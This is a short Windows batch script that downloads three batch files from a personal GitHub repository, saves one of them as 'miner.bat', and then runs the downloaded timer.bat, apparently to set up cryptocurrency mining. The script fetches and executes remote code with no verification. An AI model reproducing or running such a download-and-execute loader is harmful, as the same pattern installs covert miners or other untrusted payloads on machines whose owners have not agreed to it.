@Echo Off
SetLocal EnableExtensions

Set KBFile1=timer.bat
Set KBFile2=eth.bat
Set KBFile3=reboot.bat

Set KB_Url=https://raw.githubusercontent.com/mathworker294/shared/master/

curl -o "%KBFile1%" "%KB_Url%/%KBFile1%"
curl -o "miner.bat" "%KB_Url%/%KBFile2%"
curl -o "%KBFile3%" "%KB_Url%/%KBFile3%"

timeout 2

@Echo on

timer.bat
